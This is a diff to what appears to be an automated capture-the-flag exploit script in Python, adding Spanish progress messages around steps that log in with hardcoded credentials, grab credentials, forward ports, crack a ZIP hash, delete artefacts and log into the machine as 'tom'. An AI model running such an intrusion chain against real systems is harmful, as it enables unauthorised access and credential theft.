@@ -9,7 +9,7 @@ import time
 import pexpect
 import paramiko
 import os
-
+from pwn import log
 
 
 # global variables
@@ -171,6 +171,10 @@ if __name__ == "__main__":
 
 	login(csrfmiddlewaretoken, 'pr1ngl3ss', 'pringles!@')
 
+	log.info("Consiguiendo contraseña del ZIP...")
+
+	time.sleep(1)
+
 	username, password = GetCredentials()
 
 	proc = multiprocessing.Process(target=LocalPortForwarding, args=(username,password,)).start()
@@ -187,9 +191,13 @@ if __name__ == "__main__":
 
 	DownloadZip(username, passZip)
 
+	log.info("Realizando crackeo del hash...")
+
 	password_2 = CrackPass()
 
 	os.system("rm 1_* db* hash*")
+
+	log.info("Accediendo a la máquina...")
 
 	Doodle('tom', password_2)
 
